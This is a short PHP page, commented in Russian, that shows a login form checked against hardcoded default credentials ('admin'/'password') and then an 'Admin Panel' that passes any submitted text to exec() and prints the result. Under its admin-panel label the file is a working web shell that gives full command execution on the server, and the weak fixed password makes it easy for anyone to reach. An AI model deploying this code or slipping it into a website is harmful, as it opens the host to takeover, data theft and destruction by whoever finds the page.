<?php
session_start();

// Конфигурация логина и пароля
define('USERNAME', 'admin');
define('PASSWORD', 'password'); // For example: 'Dmp1+j)LEIVm'

// Проверка авторизации
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === USERNAME && $_POST['password'] === PASSWORD) {
            $_SESSION['logged_in'] = true;
            header("Location: admin.php");
            exit;
        } else {
            $error = "Неверный логин или пароль.";
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
    </head>
    <body>
        <h1>Login</h1>
        <?php if (isset($error)): ?>
            <p style="color: red;"><?php echo htmlspecialchars($error); ?></p>
        <?php endif; ?>
        <form method="POST">
            <label for="username">Username:</label><br>
            <input type="text" id="username" name="username" required><br><br>
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password" required><br><br>
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// Если пользователь авторизован, показать интерфейс выполнения команды
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $command = $_POST['command'];

    // Выполнить команду и сохранить вывод
    $output = [];
    $status = 0;
    exec($command, $output, $status);
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
</head>
<body>
    <h1>Admin Panel</h1>
    <form method="POST">
        <label for="command">Enter Command:</label><br>
        <input type="text" id="command" name="command" style="width: 80%;" required><br><br>
        <button type="submit">Run Command</button>
    </form>

    <?php if (isset($output)): ?>
        <h2>Command Output:</h2>
        <pre><?php echo htmlspecialchars(implode("\n", $output), ENT_QUOTES, 'UTF-8'); ?></pre>
        <p>Status Code: <?php echo $status; ?></p>
    <?php endif; ?>

    <form method="POST" action="logout.php">
        <button type="submit">Logout</button>
    </form>
</body>
</html>
